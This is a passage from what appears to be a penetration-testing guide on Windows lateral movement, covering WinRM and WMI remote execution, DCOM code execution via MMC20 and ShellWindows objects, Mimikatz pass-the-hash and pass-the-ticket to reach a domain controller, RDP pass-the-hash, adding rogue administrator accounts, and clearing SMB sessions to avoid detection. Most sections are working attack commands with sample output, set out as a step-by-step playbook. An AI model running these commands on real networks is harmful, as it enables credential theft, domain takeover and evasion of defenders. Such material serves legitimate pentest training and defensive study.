<p>Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it’s utilizing WMI, it can be thought of as an HTTP based API for WMI. WinRM will listen on one of two ports: 5985/tcp (HTTP) and 5986/tcp (HTTPS)</p>
<p>If one of these ports is open, WinRM is configured and you can try entering a remote session.</p>
<section id="enabling-ps-remoting">
<h4>Enabling PS-Remoting<a class="headerlink" href="#enabling-ps-remoting" title="Link to this heading"></a></h4>
<p>Configure the remote machine to work with WinRM. We need to run the below command from elevated powershell prompt</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\Windows\system32&gt; Enable-PSRemoting -Force</span>
<span class="go">WinRM already is set up to receive requests on this machine.</span>
<span class="go">WinRM has been updated for remote management.</span>
<span class="go">Created a WinRM listener on HTTP://* to accept WS-Man requests to any IP on this machine.</span>
<span class="go">WinRM firewall exception enabled.</span>
</pre></div>
</div>
</section>
<section id="testing-the-winrm-connection">
<h4>Testing the WinRM Connection<a class="headerlink" href="#testing-the-winrm-connection" title="Link to this heading"></a></h4>
<p>We can use the Test-WSMan function to check if target is configured for WinRM. It should return information returned about the protocol version and wsmid</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; Test-WSMan XXXX-APPS03.example.com</span>
<span class="go">wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd</span>
<span class="go">ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd</span>
<span class="go">ProductVendor   : Microsoft Corporation</span>
<span class="go">ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 2.0</span>
</pre></div>
</div>
</section>
<section id="adding-trusted-host-in-winrm">
<h4>Adding Trusted Host in WinRM<a class="headerlink" href="#adding-trusted-host-in-winrm" title="Link to this heading"></a></h4>
<p>Add Winrm Trusted Host in Windows</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">winrm set winrm/config/client @{TrustedHosts=&quot;RemoteComputerName&quot;}</span>
</pre></div>
</div>
</section>
<section id="powershell-invoke-command">
<h4>PowerShell Invoke-Command<a class="headerlink" href="#powershell-invoke-command" title="Link to this heading"></a></h4>
<p>Execute commands using Powershell Invoke-Command on the target over WinRM.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; Invoke-Command -ComputerName XXXX-APPS03.xxx.example.com -ScriptBlock {ipconfig /all}</span>

<span class="go">Windows IP Configuration</span>

<span class="go"> Host Name . . . . . . . . . . . . : XXXX-Apps03</span>
<span class="go"> Primary Dns Suffix  . . . . . . . : xxx.example.com</span>
<span class="go"> Node Type . . . . . . . . . . . . : Hybrid</span>
<span class="go"> IP Routing Enabled. . . . . . . . : No</span>
<span class="go"> WINS Proxy Enabled. . . . . . . . : No</span>
<span class="go"> DNS Suffix Search List. . . . . . : xxx.example.com</span>
<span class="go">                                     example.com</span>
</pre></div>
</div>
</section>
<section id="interactive-powershell-session">
<h4>Interactive PowerShell session<a class="headerlink" href="#interactive-powershell-session" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; Enter-PSSession -ComputerName XXXX-APPS03.xxx.example.com</span>
<span class="go">[XXXX-APPS03.xxx.example.com]: PS C:\Users\dummyuser\Documents&gt; whoami</span>
<span class="go">example.com\dummyuser</span>
</pre></div>
</div>
<p>The above commands are executed using runas /netonly if you want to run it with the credentials we can use</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-credential domainname\username switch</span>
</pre></div>
</div>
</section>
<section id="disable-powershell-remoting">
<h4>Disable Powershell Remoting<a class="headerlink" href="#disable-powershell-remoting" title="Link to this heading"></a></h4>
<p>Also, if you want to disable the psremoting/ WinRM, you can utilize <a class="reference external" href="https://msdn.microsoft.com/en-us/powershell/reference/4.0/microsoft.powershell.core/disable-psremoting">Disable-PSRemoting</a> . However, if you get</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\Windows\system32&gt; Disable-PSRemoting</span>
<span class="go">WARNING: Disabling the session configurations does not undo all the changes made by the Enable-PSRemoting or</span>
<span class="go">Enable-PSSessionConfiguration cmdlet. You might have to manually undo the changes by following these steps.</span>
<span class="go">    1. Stop and disable the WinRM service.</span>
<span class="go">    2. Delete the listener that accepts requests on any IP address.</span>
<span class="go">    3. Disable the firewall exceptions for WS-Management communications.</span>
<span class="go">    4. Restore the value of the LocalAccountTokenFilterPolicy to 0, which restricts remote access to members of the Administrators group on the computer.</span>
</pre></div>
</div>
<p>then follow the <a class="reference external" href="https://blogs.technet.microsoft.com/bshukla/2011/04/27/how-to-revert-changes-made-by-enable-psremoting/">How to revert changes made by Enable-PSRemoting?</a></p>
<p>Scott Sutherland has written <a class="reference external" href="https://blog.netspi.com/powershell-remoting-cheatsheet/">PowerShell Remoting Cheatsheet</a> which can be referred too.</p>
</section>
</section>
<section id="id18">
<h3>WMI<a class="headerlink" href="#id18" title="Link to this heading"></a></h3>
<p>As per the TechNet article <a class="reference external" href="https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx">Windows Management Instrumentation</a> (WMI) is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers.</p>
<section id="local-code-execution">
<h4>Local code execution<a class="headerlink" href="#local-code-execution" title="Link to this heading"></a></h4>
<p>WMI Process Create: The Win32_Process class can be called via WMI to query, modify, terminate, and create running processes.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic path win32_process call create &quot;calc.exe&quot;</span>
<span class="go">Executing (win32_process)-&gt;create()</span>
<span class="go">Method execution successful.</span>
<span class="go">Out Parameters:</span>
<span class="go">instance of __PARAMETERS</span>
<span class="go">{</span>
<span class="go">      ProcessId = 2616;</span>
<span class="go">      ReturnValue = 0;</span>
<span class="go">};</span>
</pre></div>
</div>
<p>The command returns the ProcessID and the ReturnValue (0 abcning no errors)</p>
</section>
<section id="remote-code-execution">
<h4>Remote code execution<a class="headerlink" href="#remote-code-execution" title="Link to this heading"></a></h4>
<p>We can use runas command to authenticate as a different user and then execute commands using wmic or use</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic /node:computername /user:domainname\username path win32_process call create &quot;**empire launcher string here**&quot;</span>
</pre></div>
</div>
<p>instead of computername, we can specify textfile containing computernames and specify using wmic /node:&#64;textfile</p>
<p>Refer Rop-Nop blog <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part3: Wmi and winrm</a></p>
</section>
</section>
<section id="dcom">
<h3>DCOM<a class="headerlink" href="#dcom" title="Link to this heading"></a></h3>
<p>The below is as per my understanding (I might be wrong), if so, please do correct me. After reading <a class="reference external" href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">Lateral Movement Using the MMC20.Application COM Object</a> and <a class="reference external" href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral Movement Via DCOM Round 2</a> I believe there are three ways to do lateral movement by using DCOM</p>
<section id="dcom-applications-via-mmc-application-class-mmc20-application">
<h4>DCOM applications via MMC Application Class (MMC20.Application)<a class="headerlink" href="#dcom-applications-via-mmc-application-class-mmc20-application" title="Link to this heading"></a></h4>
<p>This COM object allows you to script components of MMC snap-in operations. there is a method named “ExecuteShellCommand” under Document.ActiveView.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;IPAddress&quot;))</span>
<span class="go">PS C:\&gt; $com.Document.ActiveView.ExecuteShellCommand(&quot;C:\Windows\System32\calc.exe&quot;,$null,$null,7)</span>
</pre></div>
</div>
<p>For Empire</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span>com.Document.ActiveView.ExecuteShellCommand<span class="o">(</span><span class="s2">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span>,<span class="nv">$null</span>,<span class="s2">&quot;-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; &quot;</span>,<span class="s2">&quot;7&quot;</span><span class="o">)</span>
</pre></div>
</div>
<p>Tanoy has written a simple wrapper/ function <a class="reference external" href="https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1">Invoke-MMC20RCE.ps1</a> which might be useful.</p>
</section>
<section id="dcom-via-shellexecute">
<h4>DCOM via ShellExecute<a class="headerlink" href="#dcom-via-shellexecute" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">com</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>Type<span class="o">]</span>::GetTypeFromCLSID<span class="o">(</span><span class="s1">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span>,<span class="s2">&quot;IPAddress&quot;</span><span class="o">)</span>
<span class="gp">$</span><span class="nv">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Activator<span class="o">]</span>::CreateInstance<span class="o">(</span><span class="nv">$com</span><span class="o">)</span>
<span class="gp">$</span><span class="nv">item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$obj</span>.Item<span class="o">()</span>
<span class="gp">$</span>item.Document.Application.ShellExecute<span class="o">(</span><span class="s2">&quot;cmd.exe&quot;</span>,<span class="s2">&quot;/c calc.exe&quot;</span>,<span class="s2">&quot;C:\windows\system32&quot;</span>,<span class="nv">$null</span>,0<span class="o">)</span>
<span class="go">^ The above should run a calc</span>
</pre></div>
</div>
</section>
<section id="dcom-via-shellbrowserwindow">
<h4>DCOM via ShellBrowserWindow<a class="headerlink" href="#dcom-via-shellbrowserwindow" title="Link to this heading"></a></h4>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Windows 10 Only, the object doesn’t exists in Windows 7</p>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">com</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>Type<span class="o">]</span>::GetTypeFromCLSID<span class="o">(</span><span class="s1">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span>,<span class="s2">&quot;IPAddress&quot;</span><span class="o">)</span>
<span class="gp">$</span><span class="nv">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Activator<span class="o">]</span>::CreateInstance<span class="o">(</span><span class="nv">$com</span><span class="o">)</span>
<span class="gp">$</span>obj.Application.ShellExecute<span class="o">(</span><span class="s2">&quot;cmd.exe&quot;</span>,<span class="s2">&quot;/c calc.exe&quot;</span>,<span class="s2">&quot;C:\windows\system32&quot;</span>,<span class="nv">$null</span>,0<span class="o">)</span>
<span class="go">^ The above should run a calc</span>
</pre></div>
</div>
<p>All the above three method, assumes that either you are running the commands as administrator of the remote machine. And you have achieved it either by using runas /netonly or logging in as that user.</p>
<p>While executing the above if you get the below error, it means, we do not have access to execute object remotely which results in “Access Denied”:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">com</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>Type<span class="o">]</span>::GetTypeFromCLSID<span class="o">(</span><span class="s1">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span>,<span class="s2">&quot;IPAddress&quot;</span><span class="o">)</span>
<span class="gp">$</span><span class="nv">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Activator<span class="o">]</span>::CreateInstance<span class="o">(</span><span class="nv">$com</span><span class="o">)</span>
<span class="go">Exception calling &quot;CreateInstance&quot; with &quot;1&quot; arguement(s) &quot;Retrieving the COM class factory for remote component with CLSID {} from machine IPAddress failed due to the following error 80070005.</span>

<span class="go">At line:1 char:1</span>
<span class="go">+ $obj = [System.Activator]::CreateInstance($com)</span>
<span class="go">  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
<span class="go">  +CategoryInfo             : NotSpecified: (:), MethodInvocationException</span>
<span class="go">  +FullyQualifiedErrorID    : UnauthorizedAccessException</span>
</pre></div>
</div>
</section>
</section>
<section id="mimikatz-pth-ptt">
<h3>Mimikatz PTH/ PTT<a class="headerlink" href="#mimikatz-pth-ptt" title="Link to this heading"></a></h3>
<p>Microsoft <a class="reference external" href="https://gallery.technet.microsoft.com/Advanced-Threat-Analytics-8b0a86bc">Advanced Threat Analytics Attack Simulation Playbook</a> has provided examples for Mimikatz PTH, PTT.</p>
<p>If we do not have plaintext credentials, we can use NTLM hashes to get a shell</p>
<section id="pass-the-hash">
<h4>Pass the Hash<a class="headerlink" href="#pass-the-hash" title="Link to this heading"></a></h4>
<p>Using a technique called Overpass-the-Hash we can take the NTLM hash and use it to obtain a Ticket Granting Ticket (TGT) via Kerberos\ Active Directory. With a TGT you can masquerade as the administrative user and access any domain resource that admin user has access to.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”</span>
</pre></div>
</div>
<p>A new command prompt session opens. This new command prompt injected Admin user credentials into it!</p>
<p>This can be verified by checking</p>
<ul class="simple">
<li><p>If we have access to the C drive of the remote machine</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">dir \\remote-machine\c$</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Inspect tickets in Overpass-the-hash command prompt: From the new command prompt that opened from the Overpass-the-hash attack, execute the following:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">klist</span>
</pre></div>
</div>
</div></blockquote>
<p>We should be able to see the ticket of the admin user.</p>
</section>
<section id="pass-the-ticket">
<h4>Pass the ticket<a class="headerlink" href="#pass-the-ticket" title="Link to this heading"></a></h4>
<p>Let’s assume, we got credentials of Local Admin A, by which we can login in to the machine on which Domain Admin is logged on. We would utilize pass the ticket for this</p>
<ul class="simple">
<li><p>Harvest Credentials</p></li>
<li><p>Execute Mimikatz against Admin-PC ( on which domain admin is logged on )</p></li>
</ul>
<blockquote>
<div><p>From the new command prompt, running in the context of admin user, go to the part of the filesystem where Mimikatz is located from that library. Run the following commands:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xcopy mimikatz \\admin-pc\c$\temp</span>
</pre></div>
</div>
<p>Next, execute MimiKatz remotely to export all Kerberos tickets from Admin-PC:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">psexec.exe \\admin-pc -accepteula cmd /c (cd c:\temp ^&amp; mimikatz.exe “privilege::debug”   “sekurlsa::tickets /export” ^&amp; “exit”)</span>
</pre></div>
</div>
<p>Copy these tickets back to Victim-PC:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xcopy \\admin-pc\c$\temp c:\temp\tickets</span>
</pre></div>
</div>
<p>We successfully executed Mimikatz remotely, exporting all Kerberos tickets from Admin-PC. We copied back the results to Victim-PC, and now has one of the Domain Admin credentials without having to exploit his computer!</p>
</div></blockquote>
<ul class="simple">
<li><p>Locate the Domain Admin user TGT</p></li>
</ul>
<blockquote>
<div><p>Locate the kirbi files which are not Domain Admin user (i.e. “ADMIN-PC$”). Delete those and keep the Domain Admin user tickets.</p>
</div></blockquote>
<ul class="simple">
<li><p>Pass-the-Ticket</p></li>
</ul>
<blockquote>
<div><p>We can pass the Domain Admin User tickets, literally, into memory and use them to gain access to resources as if you were Domain Admin. The attacker is ready to import them into Victim-PC’s memory, to get the credentials to access sensitive resources.</p>
<p>From an elevated command prompt, where Mimikatz is located on the filesystem, execute the following:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mimikatz.exe “privilege::debug” “kerberos::ptt c:\temp\tickets” “exit”</span>
</pre></div>
</div>
<p>Ensure that the <a class="reference external" href="mailto:DomainAdminUser&#37;&#52;&#48;krbtgt-Domainname">DomainAdminUser<span>&#64;</span>krbtgt-Domainname</a> tickets were successfully imported. Now, let’s validate that the right tickets are in the command prompt session.</p>
</div></blockquote>
<ul class="simple">
<li><p>Validate the ticket was imported</p></li>
</ul>
<blockquote>
<div><p>Execute the following in the same elevated command prompt:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">klist</span>
</pre></div>
</div>
<p>The attacker now successfully imported the harvested ticket into the session, and will now leverage their new privilege and access to access the domain controller’s C drive</p>
</div></blockquote>
<ul class="simple">
<li><p>Access contents of dc1c$ with DomainAdminUser credential</p></li>
</ul>
<blockquote>
<div><p>Execute the following in the same command prompt to which the tickets were just imported.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">dir \\dc1\c$</span>
</pre></div>
</div>
<p>The attacker is now, for all intents and purposes, DomainAdminUser, in the digital world. Only administrators should be able to access the root of the domain controller. The attacker is using legitimate credentials, can access legitimate resources and executing legitimate executables.</p>
</div></blockquote>
</section>
</section>
<section id="xfreerdp-remote-desktop">
<h3>xfreerdp/ Remote Desktop<a class="headerlink" href="#xfreerdp-remote-desktop" title="Link to this heading"></a></h3>
<section id="rdesktop">
<h4>rdesktop<a class="headerlink" href="#rdesktop" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rdesktop IPAddress</span>
</pre></div>
</div>
<p>Remote Desktop with 90% Screen</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rdesktop -g 90%</span>
<span class="go">rdesktop -f : for Full screen. Fullscreen mode can be toggled at any time using Ctrl-Alt-Enter.</span>
</pre></div>
</div>
</section>
<section id="pass-the-hash-with-remote-desktop">
<h4>Pass the Hash with Remote Desktop<a class="headerlink" href="#pass-the-hash-with-remote-desktop" title="Link to this heading"></a></h4>
<p>If we have a hash of a user, we can use xfreerdp to have remote desktop</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xfreerdp /u:user /d:domain /pth:hash /v:IPAddress</span>
</pre></div>
</div>
<p>More information refer <a class="reference external" href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/">Passing the Hash with Remote Desktop</a></p>
<div class="admonition-todo admonition" id="id19">
<p class="admonition-title">Todo</p>
<p>—-dsquery !! SubMSI ? MSUtil to use RCE?
—-Any commands if net, or powershell is blocked? or PV/ BH is caught?</p>
</div>
</section>
</section>
</section>
<section id="useful-stuff">
<span id="id20"></span><h2>Useful Stuff<a class="headerlink" href="#useful-stuff" title="Link to this heading"></a></h2>
<section id="add-remove-a-local-user">
<h3>Add/ remove/ a local user<a class="headerlink" href="#add-remove-a-local-user" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net user /add [username] [password]</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net user John xxxxxxxxx /ADD</span>

<span class="go">C:\&gt;net user /add John *</span>
<span class="go">Type a password for the user:</span>
<span class="go">Retype the password to confirm:</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
</section>
<section id="add-a-domain-user">
<h3>Add a domain user<a class="headerlink" href="#add-a-domain-user" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net user username password /ADD /DOMAIN</span>
</pre></div>
</div>
</section>
<section id="add-remove-a-local-user-to-administrator-group">
<h3>Add / remove a local user to administrator group<a class="headerlink" href="#add-remove-a-local-user-to-administrator-group" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net localgroup administrators [username] /add</span>
</pre></div>
</div>
<section id="change-local-user-password">
<h4>Change local user password<a class="headerlink" href="#change-local-user-password" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net user username newpassword</span>
</pre></div>
</div>
</section>
</section>
<section id="accessing-remote-machines">
<h3>Accessing Remote machines<a class="headerlink" href="#accessing-remote-machines" title="Link to this heading"></a></h3>
<section id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="Link to this heading"></a></h4>
<p>Setup an SMB connection with a host</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; net use \\DC.xxxxxxxx.net</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
<p>Check for access to admin shares (“C$”, or “ADMIN$”), if we are admin:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; dir \\DC.xxxxxxxxxx.net\C$\Users</span>

<span class="go">Directory: \\DC.xxxxxxxx.net\C$\Users</span>

<span class="go">Mode                LastWriteTime     Length Name</span>
<span class="go">----                -------------     ------ ----</span>
<span class="go">d----        20.11.2016     09:35            axx.xxxxxx</span>
<span class="go">d----        21.11.2010     06:47            Administrator</span>
<span class="go">d-r--        14.07.2009     06:57            Public</span>
</pre></div>
</div>
<p>If we are not admin, we might get access denied:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; dir \\DC.xxxxxxxxxx.net\C$\Users</span>
<span class="go">Access is denied.</span>
</pre></div>
</div>
<p>Check your net connections:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:&gt; net use</span>
<span class="go">New connections will be remembered.</span>

<span class="go">Status       Local     Remote                    Network</span>

<span class="go">-------------------------------------------------------------------------------</span>
<span class="go">OK                     \\DC.xxxxxxxx.net\IPC$   Microsoft Windows Network</span>
<span class="go">The command completed successfully.</span>
</pre></div>
</div>
<p>However, if administrator on DC.xxxxx.net runs a net session command, the connections would be detected. For that issue</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net use /delete *</span>
</pre></div>
</div>
<p>On windows, after running this, if we execute</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">//IPAddress/C$</span>
</pre></div>
</div>
<p>we should be able to view the directory via windows explorer.</p>
</section>
<section id="linux">
<h4>Linux<a class="headerlink" href="#linux" title="Link to this heading"></a></h4>
<p>smbclient: We can use smbclient to access the remote computer file-system.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">smbclient -L hostname -U domainname\\username</span>

<span class="go">-L|--list This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don&#39;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.</span>
</pre></div>
</div>
<p>The below will drop you in to command line</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">smbclient \\\\hostname\\C$ -U domainname\\username</span>
<span class="gp gp-VirtualEnv">(After entering the password)</span>

<span class="go">smb: \&gt; ls</span>
<span class="go">smb: \&gt; ls</span>
<span class="gp">$</span>Recycle.Bin<span class="w">                      </span>DHS<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Nov<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">20</span>:00:40<span class="w"> </span><span class="m">2016</span>
<span class="go">.rnd                                A     1024  Mon Jul 27 13:51:24 2015</span>
<span class="go">Boot                              DHS        0  Mon Jul 27 14:16:53 2015</span>
<span class="go">bootmgr                          AHSR   333257  Sat Apr 11 21:42:12 2009</span>
<span class="go">BOOTSECT.BAK                      ASR     8192  Wed Jul 21 09:01:52 2010</span>
<span class="go">Certificate                         D        0  Sun Jun 23 17:20:48 2013</span>
<span class="go">Config.Msi                        DHS        0  Thu Feb 16 01:49:59 2017</span>
<span class="go">cpqsprt.trace                       A     8004  Wed Jul 21 08:59:57 2010</span>
<span class="go">cpqsystem                           D        0  Wed Jul 21 08:32:58 2010</span>
<span class="go">csv.err                             A       90  Sun May 20 15:35:38 2012</span>
<span class="go">csv.log                             A      278  Sun May 20 15:35:38 2012</span>
<span class="go">Documents and Settings            DHS        0  Sat Jan 19 19:53:20 2008</span>
<span class="go">Program Files                      DR        0  Thu Sep  8 16:24:36 2016</span>
<span class="go">Program Files (x86)                DR        0  Tue Nov 22 21:28:01 2016</span>
<span class="go">ProgramData                        DH        0  Thu Feb  9 16:51:52 2017</span>
<span class="go">Rename.bat                          A     1406  Wed Oct 26 15:11:19 2011</span>
<span class="go">System Volume Information         DHS        0  Thu Feb 16 01:49:56 2017</span>
<span class="go">temp                                D        0  Fri Aug  9 17:16:55 2013</span>
<span class="go">Users                              DR        0  Wed Nov 30 20:00:08 2016</span>
<span class="go">Windows                             D        0  Wed Feb 15 23:18:12 2017</span>
</pre></div>
</div>
<p><strong>Recursively download a directory using smbclient?</strong></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">smbclient &#39;\\server\share&#39;</span>
<span class="go">mask &quot;&quot;</span>
<span class="go">recurse ON</span>
<span class="go">prompt OFF</span>
<span class="go">cd &#39;path\to\remote\dir&#39;</span>
<span class="go">lcd &#39;~/path/to/download/to/&#39;</span>
<span class="go">mget *</span>
</pre></div>
</div>
<p>or mount the share directly</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mount -t cifs -o username=&lt;share user&gt;,password=&lt;share password&gt;,domain=example.com //WIN_PC_IP/&lt;share name&gt; /mnt</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="a-i-interesting-stories">
<span id="appendix-i-interesting-stories"></span><h2>A-I : Interesting Stories<a class="headerlink" href="#a-i-interesting-stories" title="Link to this heading"></a></h2>
<section id="targeting-domain-administrator">
<h3>Targeting Domain Administrator!<a class="headerlink" href="#targeting-domain-administrator" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>RastaMouse talks about his experiences in a blog on <a class="reference external" href="https://rastamouse.me/2017/06/psexec-much/">PSExec Much?</a> Here he starts with a domain user and make his way to Domain Administrator account utilizing Powerview/ Invoke-LoginPrompt.</p></li>
<li><p>Sean Metcalf has written a awesome blog on <a class="reference external" href="https://adsecurity.org/?p=2362">Attack Methods for Gaining Domain Admin Rights in Active Directory</a></p></li>
<li><p>Fuzzy Security has written a amazing blog showing the journey of Local Administrator to a Domain User to Domain Administrator in his blog <a class="reference external" href="http://www.fuzzysecurity.com/tutorials/25.html">Windows Domains, Pivot &amp; Profit</a></p></li>
<li><p>Nikhil SamratAshok Mittal has written a blog on <a class="reference external" href="http://www.labofapenetrationtester.com/2016/02/getting-domain-admin-with-kerberos-unconstrained-delegation.html">Getting Domain Admin with Kerberos Unconstrained Delegation</a> Sean Metcalf has written <a class="reference external" href="https://adsecurity.org/?p=1667">Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)</a></p></li>
</ul>
</section>
<section id="others">
<h3>Others<a class="headerlink" href="#others" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>Identify High Risk Windows Assets : Scott Sutherland writes a powershell way and <a class="reference external" href="https://blog.netspi.com/a-faster-way-to-identify-high-risk-windows-assets">A Faster Way to Identify High Risk Windows Assets</a> Active Directory stores the operating system version and service pack level for every Windows system associated with the domain.  The information can be used during penetration tests to target systems missing patches like MS08-67, or identification of high risk assets.</p></li>
<li><p><a class="reference external" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggestor</a> tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.</p></li>
</ul>
<section id="smbrelay">
<h4>SMBRelay<a class="headerlink" href="#smbrelay" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Scott Sutherland has written <a class="reference external" href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/">Executing SMB Relay Attacks via SQL Server using Metasploit</a></p></li>
<li><p>To lure the victim, so that they give their hashes for cracking/ relaying Karl Fosaaen has written a blog on <a class="reference external" href="https://blog.netspi.com/10-places-to-stick-your-unc-path/">10 Places to Stick Your UNC Path</a></p></li>
<li><p>By default PowerShell is configured to prevent the execution of PowerShell scripts on Windows systems which can be a hurdle for penetration testers, sysadmins, and developers. Scott Sutherland has written <a class="reference external" href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">15 Ways to Bypass the PowerShell Execution Policy</a></p></li>
</ul>
</section>
<section id="windows-privilege-escalation">
<h4>Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.netspi.com/windows-privilege-escalation-part-1-local-administrator-privileges/">Windows Privilege Escalation Part 1: Local Administrator Privileges</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/windows-privilege-escalation-part-2-domain-admin-privileges/">Windows Privilege Escalation Part 2: Domain Admin Privileges</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/">5 Ways to Find Systems Running Domain Admin Processes</a></p></li>
</ul>
</section>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="LFF-IPS-P2-VulnerabilityAnalysis.html" class="btn btn-neutral float-left" title="Vulnerability Analysis" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="LFF-IPS-P4-PostExploitation.html" class="btn btn-neutral float-right" title="Post Exploitation" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
